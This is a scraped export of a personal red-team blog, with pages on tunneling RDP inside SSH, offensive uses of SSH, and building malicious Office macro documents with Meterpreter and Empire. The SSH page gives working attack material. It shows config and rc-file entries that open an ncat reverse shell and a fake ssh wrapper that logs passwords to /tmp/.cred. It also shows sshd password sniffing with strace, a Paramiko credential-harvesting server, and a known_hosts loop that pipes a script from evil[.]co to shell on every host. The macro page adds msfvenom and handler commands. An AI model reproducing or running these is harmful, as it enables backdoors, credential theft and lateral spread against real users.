[{"content":" Scenarios # Think stealth. In many enterprises, direct RDP connections to the internet are blocked‚Äîboth inbound and outbound. Firewalls or egress filters cut off outbound RDP (TCP 3389) to prevent users or attackers from opening remote desktop sessions directly to the outside world.\nBut here‚Äôs the catch: SSH is rarely blocked. Outbound SSH (TCP 22) is often allowed, either for administrators, developers, or automated processes that legitimately need it. This becomes the perfect cover channel.\nBy wrapping RDP traffic inside an SSH tunnel, we bypass the outbound block entirely. To the firewall, it looks like a normal, permitted SSH session. Inside that encrypted stream, however, we‚Äôre smuggling RDP traffic.\nThis dual effect makes SSH tunneling attractive:\nFor admins/developers: It provides secure, encrypted access without exposing RDP directly. For attackers: It‚Äôs a stealth highway‚ÄîRDP hidden inside an allowed protocol, nearly invisible to traditional firewall rules or simple packet inspection. In short: block RDP all you want‚Äîif SSH is open, attackers can still tunnel through.\nWork # Let‚Äôs break down how RDP tunneling through SSH actually works in practice:\nThe Environment\nInside the enterprise, there‚Äôs a Windows host running RDP on TCP 3389.\nThe firewall is locked down against inbound internet connections (a common setup), but outbound traffic is allowed.\nOn the outside, the operator controls a Linux server‚Äîoften called a bastion or C2 node.\nThe Pivot Calls Out\nFrom within the network, a machine that can reach the Windows RDP host initiates an outbound SSH connection to the external Linux server on TCP 22.\nBecause it‚Äôs outbound, the firewall happily lets it through.\nBuilding the Tunnel\nAs part of that SSH session, the operator sets up a remote port forward.\nIn simple terms:\n‚ÄúHey Linux server, listen on 127.0.0.1:12345. Anything that comes in there‚Äîwrap it up, send it through this encrypted tunnel, and I‚Äôll hand it off to the RDP service inside.‚Äù\nListener Comes Alive\nNow the Linux server has a local-only listener running on 127.0.0.1:12345.\nNothing has touched the RDP host yet‚Äîit‚Äôs just a waiting pipe.\nOperator Connects Over RDP\nThe operator fires up an RDP client on the Linux server, pointing it at 127.0.0.1:12345.\nFrom the client‚Äôs perspective, it looks like a normal local connection.\nTraffic Flows Inside SSH\nThe bytes from that RDP session don‚Äôt terminate on the Linux box.\nInstead, SSH forwards them straight through the encrypted session on TCP 22.\nDelivered to the Real RDP Host\nOn the inside, the SSH client receives the forwarded bytes and opens a standard TCP connection to the Windows host on port 3389.\nFrom the Windows box‚Äôs perspective, it‚Äôs just a normal LAN connection.\nEnd-to-End Session\nFrom here on out, every RDP packet flows like this:\nThe firewall only sees an allowed SSH session. It cannot inspect the RDP traffic inside because it‚Äôs fully encrypted.\nRDP client ‚Üí 127.0.0.1:12345 (Linux) ‚Üí SSH tunnel on TCP 22 ‚Üí firewall ‚Üí inside pivot ‚Üí Windows:3389\nWhat Each Party Sees # Perimeter firewall: One long-lived outbound SSH connection with steady bandwidth. Linux server: A loopback listener on 12345 receiving an RDP handshake. Windows host: A local inbound connection to port 3389, as if it came from a machine inside the network. Ports in play:\n22 ‚Üí SSH tunnel transport 12345 ‚Üí External loopback helper port 3389 ‚Üí Actual RDP service Ephemeral ports ‚Üí Temporary client-side sources Why It Works # The firewall is configured to block inbound connections, but nothing stops an internal host from calling out.\nBy wrapping RDP inside an outbound SSH tunnel, the operator bypasses the ‚Äúno inbound‚Äù policy.\nFrom the outside world, nobody ever connects directly to port 3389‚ÄîRDP is completely hidden inside SSH.\nPractice # Environment Setup # For this lab, we‚Äôll simulate a simple network:\nAttacker (Kali Linux): 192.168.50.2 Victim (Windows 10): 192.168.50.3 The attacker will use SSH tunneling to reach the RDP service running on the victim, even though direct RDP connections are blocked.\nSteps # Victim:\nplink.exe \u0026lt;users\u0026gt;@\u0026lt;IP or domain\u0026gt; -pw \u0026lt;password\u0026gt; -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389\nAttacker:\nxfreerdp3 /u:\u0026lt;user\u0026gt; /p:\u0026lt;password\u0026gt; /v:127.0.0.1:12345\nEnable outbound rule for mstsc Remmina Fail when connect directly with rdp connection xfreerdp Success through ssh tunnel References # Bypassing Network Restrictions Through RDP Tunneling ","date":"29 August 2025","externalUrl":null,"permalink":"/redteam/persistence/scheduledtasks-services/rdptunneling/","section":"Red team","summary":"When the firewall says \u0026rsquo;no way in,\u0026rsquo; we tunnel our own highway.","title":"Bypassing Network Restrictions Through RDP Tunneling","type":"redteam"},{"content":"","date":"29 August 2025","externalUrl":null,"permalink":"/tags/evasion/","section":"Tags","summary":"","title":"Evasion","type":"tags"},{"content":" I‚Äôm in.\nI stay.\nYou won‚Äôt even know. Account Creation / Backdoors\nScheduled Tasks / Services\nRegistry / Startup Modifications\n","date":"29 August 2025","externalUrl":null,"permalink":"/redteam/persistence/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  I‚Äôm in.\u003cbr\u003e\nI stay.\u003cbr\u003e\nYou won‚Äôt even know.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eAccount Creation / Backdoors\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eScheduled Tasks / Services\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRegistry / Startup Modifications\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"Persistence","type":"redteam"},{"content":"","date":"29 August 2025","externalUrl":null,"permalink":"/tags/persistence/","section":"Tags","summary":"","title":"Persistence","type":"tags"},{"content":"","date":"29 August 2025","externalUrl":null,"permalink":"/tags/rdp/","section":"Tags","summary":"","title":"Rdp","type":"tags"},{"content":" ‚ÄúTalk is cheap. Show me the code.‚Äù ‚Äï Linus Torvalds\n\u0026ldquo;Talk is cheap. Show me POC.\u0026rdquo;\n","date":"29 August 2025","externalUrl":null,"permalink":"/redteam/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  \u003cp\u003e‚ÄúTalk is cheap. Show me the code.‚Äù ‚Äï Linus Torvalds\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;Talk is cheap. Show me POC.\u0026rdquo;\u003c/p\u003e\n\n\u003c/div\u003e","title":"Red team","type":"redteam"},{"content":"","date":"29 August 2025","externalUrl":null,"permalink":"/tags/redteam/","section":"Tags","summary":"","title":"Redteam","type":"tags"},{"content":" Master the system before it masters you. ","date":"29 August 2025","externalUrl":null,"permalink":"/redteam/persistence/scheduledtasks-services/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Master the system before it masters you.\n\u003c/div\u003e","title":"Scheduled Tasks \u0026\u0026 Services","type":"redteam"},{"content":"","date":"29 August 2025","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"Ssh","type":"tags"},{"content":"Want to go further? Check out the advanced tag for more powerful and in-depth insights.\n","date":"29 August 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"\u003cp\u003eWant to go further? Check out the \u003ca\n  href=\"https://odanbroder.github.io/tags/advanced/\"\u003eadvanced tag\u003c/a\u003e\n for more powerful and in-depth insights.\u003c/p\u003e\n\u003chr\u003e","title":"Tags","type":"tags"},{"content":"echo SeKAmW0gQnJvZGVyIOKAlCBmdWVsZWQgYnkgZXhwbG9pdHMgYW5kIG1lbG9kaWVzLCB3aGVyZSBzZWN1cml0eSBtZWV0cyBzb3VuZC4= | base64 -d ","date":"29 August 2025","externalUrl":null,"permalink":"/","section":"Welcome to Blowfish! üéâ","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003eSeKAmW0gQnJvZGVyIOKAlCBmdWVsZWQgYnkgZXhwbG9pdHMgYW5kIG1lbG9kaWVzLCB3aGVyZSBzZWN1cml0eSBtZWV0cyBzb3VuZC4\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 -d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003clite-youtube videoid=\"W0C_VJqjtpw\" playlabel=\"W0C_VJqjtpw\" params=\"\"\u003e\u003c/lite-youtube\u003e","title":"Welcome to Blowfish! üéâ","type":"page"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/networking/","section":"Tags","summary":"","title":"Networking","type":"tags"},{"content":" In-depth notes and analysis on technology, systems, and techniques. This section gathers ideas, research notes, and technical documentation from ongoing learning or exploration.\nIf you\u0026rsquo;re just getting started, check out the Overview or explore some Key Topics .\n","date":"25 August 2025","externalUrl":null,"permalink":"/notes/","section":"Notes","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  In-depth notes and analysis on technology, systems, and techniques.\n\u003c/div\u003e\n\n\u003cp\u003eThis section gathers ideas, research notes, and technical documentation from ongoing learning or exploration.\u003cbr\u003e\nIf you\u0026rsquo;re just getting started, check out the \u003ca\n  href=\"https://odanbroder.github.io/notes/overview/\"\u003eOverview\u003c/a\u003e\n or explore some \u003ca\n  href=\"https://odanbroder.github.io/notes/highlights/\"\u003eKey Topics\u003c/a\u003e\n.\u003c/p\u003e","title":"Notes","type":"notes"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/protocol/","section":"Tags","summary":"","title":"Protocol","type":"tags"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/security/","section":"Tags","summary":"","title":"Security","type":"tags"},{"content":" You only really know something if you love this insight. ","date":"25 August 2025","externalUrl":null,"permalink":"/notes/services/","section":"Notes","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  You only really know something if you love this insight.\n\u003c/div\u003e","title":"Services","type":"notes"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/shell/","section":"Tags","summary":"","title":"Shell","type":"tags"},{"content":" Wrap arround # SSH (Secure Shell) is a network protocol and suite of tools that creates an encrypted connection between two computers over an unsecured network, enabling secure remote access, command execution, and file transfers. It works by establishing a secure \u0026quot;tunnel\u0026quot; where data is authenticated and encrypted to protect it from interception, and it uses either password or public-key authentication to grant access to remote servers, primarily for administration and management purposes.\nDefault port: 22\nHistory # Version 1 # In 1995, SSH-1 was designed by Tatu Yl√∂nen (prompted by a password-sniffing attack at his university network), with the goals is replace the earlier rlogin, telnet, ftp and rsh protocol (not provide strong authentication nor guarantee confidentiality). The reason for port number 22 is between telnet (port 23) and ftp (port 21).\nVersion 2 # In 2006, SSH-2 was adopted as a standard (after being discussed in a working group named \u0026ldquo;secsh\u0026rdquo;). Although this offers improved security and new features, SSH-2 is not compatible with SSH-1. The specially I notice to is \u0026ldquo;New features of SSH-2 include the ability to run any number of shell sessions over a single SSH connection.\u0026rdquo;\nVersion 1.99 # In January 2006, well after version 2.1 was established specified that an SSH server supporting 2.0 as well as prior versions should identify its protocol version as 1.99.\nSSH version 1.99 is not a distinct SSH protocol version in itself, but rather an indicator used by SSH servers. When an SSH server advertises itself as version 1.99, it signifies that the server supports both SSH version 1 (SSHv1) and SSH version 2 (SSHv2). This allows for backward compatibility, meaning the server can negotiate a connection using either the older SSHv1 protocol or the more secure and modern SSHv2 protocol, depending on the client\u0026rsquo;s capabilities and configuration.\nWhile SSHv1 offers backward compatibility, it is generally recommended to use SSHv2 due to known security vulnerabilities present in SSHv1. Many modern SSH clients and servers are configured to prioritize or exclusively use SSHv2 for enhanced security.\nOSSH and OpenSSH # ‚Äúsoftware is like sex : it\u0026rsquo;s better when it\u0026rsquo;s free..‚Äù - Linus Torvalds\nIn 1999, developers, desiring availability of a free software version, restarted software development from the 1.2.12 release of the original SSH program, which was the last released under an open source license.\nThis served as a code base for Bj√∂rn Gr√∂nvall\u0026rsquo;s OSSH software. Shortly thereafter, OpenBSD developers forked Gr√∂nvall\u0026rsquo;s code and created OpenSSH, which shipped with Release 2.6 of OpenBSD. From this version, a \u0026ldquo;portability\u0026rdquo; branch was formed to port OpenSSH to other operating systems. As of 2005\nOpenSSH was the single most popular SSH implementation, being the default version in a large number of operating system distributions. OSSH meanwhile has become obsolete. OpenSSH continues to be maintained and supports the SSH-2 protocol, having expunged SSH-1 support from the codebase in the OpenSSH 7.6 release. Future # In 2023, an alternative to traditional SSH was proposed under the name SSH3 by PhD student Fran√ßois Michel and Professor Olivier Bonaventure and its code has been made open source. This new version implements the original SSH Connection Protocol but operates on top of HTTP/3, which runs on QUIC.\nHowever, the name SSH3 is under discussion, and the project aims to rename itself to a more suitable name. The discussion stems from the fact that this new implementation significantly revises the SSH protocol, suggesting it should not be called SSH3.\nAnalyse # SSH is a network protocol that provides secure communication over unsafe environments. It ensures confidentiality and integrity, preventing attackers or unauthorized users from reading or tampering with your connection.\nSSH allows you to connect from external environments to internal machines, as well as securely communicate between systems within the internal network.\nIf an attacker compromises one machine, they can leverage SSH to pivot into other systems that the victim connects to, and even set up tunnels for faster exploitation.\nBecause SSH traffic is encrypted, IPS, IDS, and AV solutions often trust it by default and cannot inspect the activity inside the tunnel. Attackers can abuse this to ‚Äòlive off the land‚Äô or carry out sophisticated exploitation undetected.\nRed team case # Note # Run Command # We can run command when connect to a remote system\nssh victim@10.10.10.10\nor run a single command\nssh victim@10.10.10.10 whoami\nThis is very useful if the system is being actively defended, so blue team or someone is actually on the system watching for connections and seeing who\u0026rsquo;s logged in this. They\u0026rsquo;d have to catch that and run that command while the whoami command is running or whatever command you want to run.\nFile transfer # SSH also makes file transfers convenient through tools like scp and sftp.\nIf you want, you can run command singularly so you don\u0026rsquo;t even have an interactive session so it\u0026rsquo;s a lot harder to find.\nFowarding # Local fowarding # ssh -L 8080:192.168.1.10:80 victim@10.10.10.10 -N \u0026amp;\nI\u0026rsquo;ll have port 8080 on my local system will jump through that 10.10.10 system and then point at one of the systems on the other side.\nAll of that will go over the SSH tunnel. So that traffic is encrypted from my laptop here to this system. And then it comes out of here and will wind up over on looking at this system.\nListening on my host on port 8080 on my laptop. I want that traffic when I go to port 8080 to go out the other side to 192.168.1.10 on port 80. So say there\u0026rsquo;s a web server on that system that I\u0026rsquo;m trying to get access to. And then I\u0026rsquo;m logging in as Bob to that that bounce node 10.10.10.10. I should have done different IP addresses. And then interestingly here, I\u0026rsquo;m going to give it -N. So that tells it not to request a shell. And then I\u0026rsquo;m going to background it. I didn\u0026rsquo;t request a shell on the remote system.\nSo once again, if there\u0026rsquo;s a defender watching that system trying to see like run a who, or see who\u0026rsquo;s logged into it, all they\u0026rsquo;ll actually see is that there\u0026rsquo;s an SSHD process, it doesn\u0026rsquo;t actually spawn a shell or anything. And then if they\u0026rsquo;re really on the ball, they\u0026rsquo;ll look at netstat and see the network connection. But most of the time, they just won\u0026rsquo;t realize that there\u0026rsquo;s somebody logged in. And then, like I said, that\u0026rsquo;s backgrounded.\nDynamic Port Fowarding # But I don\u0026rsquo;t want to do that one by one by one through all these systems on this network. Thankfully, SSH was nice enough to think of the this the kind developers of open SSH. They implemented this thing called dynamic ports forwarding. So what this does is this lets me open up on my system, a port that will forward over that SSH channel, either SOX4 or SOX5 proxy. And then I\u0026rsquo;m essentially using that SSH server as a proxy server. And I can get to any of the systems behind that network as long as whatever I\u0026rsquo;m using speaks that SSH protocol. So if I point my, if I use this proxy port, then I can get proxy that through this system and just get to any of the systems that are behind here in the way this kind of basic network example is laid out. Can use browser or proxychains to configure dynamic port forwarding.s\nRemote Port Fowarding # I am sitting on my laptop and I would like a port on that SSH server to open up and forward that port back to my system. So I\u0026rsquo;ll do this with SSH a lot to get from a system out to the network and then be able to do all of that same forwarding and tunneling and stuff just in the opposite way.and I would like a port on that SSH server to open up and forward that port back to my system. So I\u0026rsquo;ll do this with SSH a lot to get from a system out to the network and then be able to do all of that same forwarding and tunneling and stuff just in the opposite way.\nI\u0026rsquo;m actually on, I\u0026rsquo;d have to be, I have to be on both systems in this scenario. So I\u0026rsquo;m on my laptop and then I also have access to this system in the network and I\u0026rsquo;m trying to exfil some data or something. I can\u0026rsquo;t get out because they\u0026rsquo;re blocking the internet, but I have access to this. I have access to my laptop. So what I do is I SSH and I set up a remote forward from here that says, Hey, listen 2222 here and forward that back to me on port 22, which is SSH.\nThen from this system, I can just use any of those SSH commands provided I have the SSH command line and I can do stuff like copy files to here, but it\u0026rsquo;s really forwarding to here. So anyone looking at the network traffic, nothing\u0026rsquo;s actually going out over the firewall or anything. It\u0026rsquo;s just traffic going to here. And then there\u0026rsquo;s a secure connection to here from, from the bounce host to my laptop.\nProxy Command # -o ProxyCommand=\u0026quot;ssh -W %h:%p \u0026lt;user\u0026gt;@\u0026lt;IP\u0026gt;\u0026quot;\nI have a tunnel and I want to log into that. I want to log in through my, my jump box or my bounce node. I want to land over here. So I would have to SSH to here, do a port forward to tell it to go over here and then SSH that port forward and go over here.\nSSH has this cool option called a proxy command. The proxy command is the old way to do this. And they\u0026rsquo;ve actually since implemented a new version, but proxy command is still super useful and we\u0026rsquo;ll see another use of this in just a second.\nlocal:~$ ssh -o ProxyCommand =\u0026quot;ssh -W %h:%p bob@10.10.10.10\u0026quot; bob@remote\nInstead of connecting directly, run this command to create the connection. This connect to bob@10.10.10.10 (the jump host), and then forward stdin/stdout to the final target.\nlocal:~$ ssh -J bob@10.10.10.10 bob@remote\nIt‚Äôs a shorthand for the ProxyCommand trick above.\nConclusion\nProxyCommand: old-school, very flexible (you can use nc, socat, or custom commands, not just SSH).\nJ (JumpHost): simpler, cleaner syntax, but less flexible.\n‚Üí Local (your PC) ‚Üí Jump Host (10.10.10.10) ‚Üí Remote Server (remote)\n# Define the jump host Host jump HostName 10.10.10.10 User bob # Define the remote, going through jump Host remote HostName remote # could also be an IP like 192.168.1.100 User bob ProxyJump jump Another exampler:\nssh -o ProxyCommand=\u0026quot;ncat --proxy proxyhost 1080 %h %p\u0026quot; bob@remote\n‚Üí local ssh ‚Üí ncat ‚Üí proxyhost:1080 (SOCKS proxy) ‚Üí remote:22\nHost remote HostName remote User bob ProxyCommand ncat --proxy proxyhost:1080 %h %p Auto SSH # Another thing that is very useful here is so now I have all of these tunnels and this forwarding and all of this cool stuff that I want to set up. But SSH is a TCP protocol. So if anything happens in this connection, any of the routers or something, timeout, something weird happens, that connection will die. Maybe I want this tunnel to be set up really long lived.\nAnd how I accomplish this is with a command called auto SSH. And what I like to do with this is I will set up auto SSH to log into my laptop and forward port 2222 on my laptop back to the host. It would actually forward from 2222 back to my host on 22 and tunnel that traffic. So I connect here and it goes out here. So there\u0026rsquo;s an auto SSH connection out. It sets up that remote port forward to come back.\nautossh -M 0 -o \u0026#34;ServerAliveInterval 30\u0026#34; -o \u0026#34;ServerAliveCountMax 3\u0026#34; \\ -R 127.0.0.1:2222:127.0.0.1:22 hackbox I\u0026rsquo;m giving it some options here, the server alive interval, server alive max count. So it\u0026rsquo;ll wait 30 seconds and it\u0026rsquo;ll max try three times. And then I\u0026rsquo;m telling it to remote forward on 2222 to port 22 on my local host. And then I log into my laptop, aka hack box. And then on hack box, I can SSH -P to 2222 and tell it Bob because that\u0026rsquo;s the user that I have at local host. And that\u0026rsquo;s actually going to go through that tunnel back in through the network. And then I\u0026rsquo;m just logged into that victim system.\nOnce again, this is super cool because like all someone monitoring this network would see as someone logging into a system remotely. So say you\u0026rsquo;re here, this boundary is monitored. All you see is an SSH out. You don\u0026rsquo;t actually see me tunneling back in. So it looks like someone who already has logged into this just logged into something on the internet.\nssh -p 2222 bob@localhost Graph\nVictim (behind NAT) --[Reverse SSH]--\u0026gt; Hackbox (public server) (opens port 2222 mapped to Victim:22) Now, on Hackbox:\nssh -p 2222 bob@localhost ‚Üì Tunnel sends it back to Victim:22 ‚Üì You get shell on Victim So a bunch of fun stuff you can do with port forwarding super useful for kind of crossing those security boundaries and getting into networks that you\u0026rsquo;re not necessarily supposed to have access to with auto SSH, you can maintain that access. And if you get creative with it, you can jump around and get to a bunch of different network segments and really make it confusing. With all the port forwarding, you can make it look like someone\u0026rsquo;s connecting from a different system as long as you have access to connect all through. So someone that\u0026rsquo;s trying to trace that back through network logs or system logs is going to have a rough time because you\u0026rsquo;re essentially using a proxy to get through a bunch of stuff. And you can proxy proxy proxy and jump around and good clean fun to be had by all.\nConfigs # SSH config # SSH config is get it to do stuff that people are not intending. So let\u0026rsquo;s say in this scenario, I know that Bob is SSHing from the server that he\u0026rsquo;s on, 10.10.10.10 to that system that he has internally. Every time he does that, I would like to get a shell back to me on 4141 from his system. With SSH config, I can do that. So here I configure it, say I\u0026rsquo;m on his server for some reason. I have access to his SSH config. I\u0026rsquo;m going to go ahead and I like to set this up for all hosts. By default, you\u0026rsquo;re not permitted to run a local command, but luckily in the configs file, you can just tell it to let you do that. And what I\u0026rsquo;m going to do here is tell it the local command is to netcat me a bin bash shell to my IP address on my listener and background, and then do whatever else Bob was trying to do. So every time Bob logs into a host, it will spin a shell back to me and I\u0026rsquo;ll get access to his system. So say my shells keep dying or I just want to kind of maintain access in a super easy, lightweight way. Another config file that is super awesome is this run commands file or RC file.\nGlobal: /etc/ssh/ssh_config User: ~/.ssh/config Let SSH know what to do\nAvoid some typing Interesting things Hostname * PermitLocalCommand True LocalCommand ncat -e /bin/bash \u0026lt;LISTENER IP\u0026gt; 4141 \u0026amp; RC file # Global: /etc/ssh/sshrc User: ~/.ssh/rc Run command on login ncat -e /bin/bash \u0026lt;LISTENER IP\u0026gt; 4141 \u0026amp; Stealing Credentialss # SSH Client (CONT) # /usr/local/bin/ssh\n#!/bin/bash read -esp \u0026#34;${1}\u0026#39;s password: \u0026#34; password echo \u0026#34;$1 - $password\u0026#34; \u0026gt;\u0026gt; /tmp/.cred echo /usr/bin/ssh $@ SSHD Server # # find the sshd process root@remote:~$ ps --ppid 1 | grep sshd 641 ? 00:00:00 sshd # strace sshd process and look for password root@remote:~$ strace -f -p 641 -e read |\u0026amp; grep -F \u0026#34;\\f\\0\\0\\0\u0026#34; ... [pid 2235] read(6, \u0026#34;\\f\\0\\0\\0\\10sup3s3cr3t\u0026#34;, 16) = 16 Paramiko Server # import socket import paramiko class Server(paramiko.ServerInterface): def check_auth_password(self, username, password): print(f\u0026#34;[+] username: {username} password: {password}\u0026#34;) return paramiko.AUTH_FAILED # Create raw socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.bind((\u0026#34;\u0026#34;, 22)) # Listen on port 22 (SSH) sock.listen(1) client, addr = sock.accept() print(f\u0026#34;[+] Got a connection! {addr}\u0026#34;) # Start Paramiko transport on the socket t = paramiko.Transport(client) t.add_server_key(paramiko.RSAKey(filename=\u0026#34;test_rsa.key\u0026#34;)) server = Server() t.start_server(server=server) chan = t.accept() Known Hosts # if [ -f ~.ssh//known_hosts ] \u0026amp;\u0026amp; [ -f ~/.ssh/id_rsa.pub ]; then for h in $(grep -oE \u0026#34;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026#34; ~/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h \u0026#39;hxxp://evil[.]co/evilScript | sh\u0026#39; \u0026amp; done fi Tunneling # Bypassing Network Restrictions Through RDP Tunneling Attackers often abuse tunneling techniques to bypass network restrictions and monitoring controls.\nSSH can also be weaponized as a stealthy tunneling tool ‚Äî allowing adversaries to evade firewalls, hide malicious traffic, and move laterally across systems under the cover of encrypted sessions.\nReferences # Secure Shell SSH: Dynamic Port Forwarding Grey Hat SSH SShenanigans Lateral Movement with Secure Shell (SSH) Bypassing Network Restrictions Through RDP Tunneling ","date":"25 August 2025","externalUrl":null,"permalink":"/notes/services/ssh/","section":"Notes","summary":"A deep dive into the Secure Shell (SSH) protocol, its purpose, and common uses in secure communication.","title":"SSH","type":"notes"},{"content":" Blend in. Look harmless.\nBehind the mask ‚Äî the breach begins. Phishing / Spearphishing\nExploitation (web apps, services, vulnerabilities)\nSupply Chain / Droppers / Malicious Files\n","date":"24 August 2025","externalUrl":null,"permalink":"/redteam/initialaccess/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Blend in. Look harmless.\u003cbr\u003e\nBehind the mask ‚Äî the breach begins.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePhishing / Spearphishing\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eExploitation (web apps, services, vulnerabilities)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eSupply Chain / Droppers / Malicious Files\u003c/p\u003e","title":"Initial Access","type":"redteam"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/phishing/","section":"Tags","summary":"","title":"Phishing","type":"tags"},{"content":" An inbox is a battlefield.\nEvery click ‚Äî a gamble with trust. office365 ","date":"24 August 2025","externalUrl":null,"permalink":"/redteam/initialaccess/phishing/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  An inbox is a battlefield.\u003cbr\u003e\nEvery click ‚Äî a gamble with trust.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003eoffice365\u003c/li\u003e\n\u003c/ul\u003e","title":"Phising \u0026\u0026 Spearphishing","type":"redteam"},{"content":" Scenarios # Update: Mauro Soria pointed out that this attack vector can be easily adapted for phishing scenarios:\nShare a GitHub repo\nGive some instructions to access the attacker server with Cursor or VS Code.\nPOC # Your browser does not support the video tag. poc References # ‚ÄúVibe Hacking‚Äù: Abusing Developer Trust in Cursor and VS Code Remote Development VsCodeExtLure ","date":"24 August 2025","externalUrl":null,"permalink":"/redteam/initialaccess/phishing/vscode/remotessh/","section":"Red team","summary":"Exploring malicious remote SSH access and its red team implications.","title":"Remote SSH","type":"redteam"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/remote-access/","section":"Tags","summary":"","title":"Remote-Access","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/vscode/","section":"Tags","summary":"","title":"Vscode","type":"tags"},{"content":" One click can sink the ship ","date":"24 August 2025","externalUrl":null,"permalink":"/redteam/initialaccess/phishing/vscode/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  One click can sink the ship\n\u003c/div\u003e","title":"VScode","type":"redteam"},{"content":"","date":"20 August 2025","externalUrl":null,"permalink":"/tags/c2/","section":"Tags","summary":"","title":"C2","type":"tags"},{"content":" Wrap arround # Execl # MS Word # Private Sub Document_Open() MsgBox \u0026#34;game over\u0026#34;, vbOKOnly, \u0026#34;game over\u0026#34; a = Shell(\u0026#34;calc.exe\u0026#34;, vbHide) End Sub ALT + F11 Save as .dotm Enable Content ASR (Attack surface reduction) # Attack surface reduction rules overview Attack surface reduction rules reference Introduced as part of Windows Defender Exploit Guard in Windows 10 1709.\nA set of rules\nGroup Policy Objects Some very efficient\nEx. Block all Office Applications from creating child processes. Potential to block 99.9% of all marco based attacks in the wild. ASR bypass # ASR Rules Bypass.vba Windows Defender Exploit Guard ASR VBScript/JS Rule Windows Defender Exploit Guard ASR Rules for Office Generate-Macro # Tested on Windows 10 with O365 Home Premium (M365).\nDuring execution, the payload was detected and terminated quickly by built-in antivirus/defender.\n(Correct me if I‚Äôm wrong or if you‚Äôve observed different behavior.)\nmarco_pack # Using tool macro_pack/community , more detail at blog EXCEL 4.0 XLM macro in MacroPack Pro Example echo \u0026quot;cmd.exe /c notepad.exe\u0026quot; | macro_pack.exe -o -t CMD -G test.xls\nSome security bypass features:\nSome Anti Reverse Sandbox detection Hiding macro sheet Obfuscation XLM InjectionXLM Injection This is the community edition. The Pro version unlocks advanced features such as shellcode injection, seamless Meterpreter integration, and extended exploitation capabilities.....\nLucky Strike + Powershell Empire # Attacker IP (Kali): 192.168.50.2\nVictim IP (Windows 10): 192.168.50.3\nIn this section, I would use both meterpreter and empire\nMalicious Server Deployment # Meterpreter # $ msfvenom -p windows/meterpreter/reverse_http LPORT=8080 LHOST=192.168.50.2 -f exe -o CheckGrammar.exe msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set PAYLOAD windows/meterpreter/reverse_http PAYLOAD =\u0026gt; windows/meterpreter/reverse_http msf6 exploit(multi/handler) \u0026gt; set LHOST 192.168.50.2 LHOST =\u0026gt; 192.168.50.2 msf6 exploit(multi/handler) \u0026gt; set LPORT 8080 LPORT =\u0026gt; 8080 msf6 exploit(multi/handler) \u0026gt; run [*] Started HTTP reverse handler on http://192.168.50.2:8080 Empire # I use Kali, so this is easy to install empire-starkiller After that, run with\nsudo powershell-empire server Default admin account\nUsername: empireadmin\nPassword: password123\nCreate Listener # Create Stager # Create new stager Set listener to http that just created in the previous step Enable Obfuscate mode Download this payload LuckyStrike # Transfer file to vicim machine, there are multiples ways to do this, but I interested in using http server\npython -m http.server 8000\nPrepare environment # Invoke-Obfuscation Import module Invoke-Obfuscation Install luckystrike Invoke-Obfuscation Error in finding module Find PSModulePath Copy / Move Invoke-Obfuscation folder to one of these paths Create .xls # Meterpreter # Create payload from malicious exe for reverse http (meterpreter) Configure payload Generate file .xls Empire # Create payload from malicious exe for reverse http (empire) Configure payload Generate file .xls Open .xls # infected_fNKLTJYV.xls (meterpreter) # Clink enable marco Get shell infected_fNKLTJYV.xls (empire) # Open file Add agent Terminal File Browser Attack Rating # High Realism: Macro-based attacks continue to appear in real-world incidents, targeting both IT and non-IT staff. Social Engineering Factor: Success often relies on persuading the user to click Enable Content, a surprisingly common behavior 